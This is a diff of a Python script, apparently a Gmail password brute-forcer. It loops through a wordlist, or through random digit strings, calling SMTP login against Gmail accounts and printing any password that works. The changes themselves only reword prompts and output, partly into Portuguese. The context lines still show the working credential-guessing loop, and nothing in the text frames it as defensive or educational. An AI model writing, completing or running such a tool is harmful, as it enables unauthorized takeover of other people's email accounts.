@@ -32,7 +32,7 @@ class GmailBruteForce():
             for password in self.passwords:
                 try:
                     self.smtp.login(user,password)
-                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
+                    print(("\033[1;37mSenhaCorreta -> %s " % user + " -> %s \033[1;m" % password ))
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
@@ -54,14 +54,14 @@ instance = GmailBruteForce()
 do = input('''
 		Choose any number ?
 		1 - Gmail ( Normal com wordlsit) 
-		2- Gmail já via combinação de senha
+		2-  Gmail já via combinação de senha
                 
 		
 		==> ''')
 
 if do == '1':
     user = input("gmail : ")
-    senha = input("passlist : ")
+    senha = input("sua wordlsit : ")
     headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     instance.accounts.append(user)
@@ -70,7 +70,7 @@ if do == '1':
     instance.try_gmail()
     
 if do == '2':
-    user = input("email : ")
+    user = input("gmail : ")
     senha = ''
     for i in range(10):
         senha += random.choice(string.digits+' ')
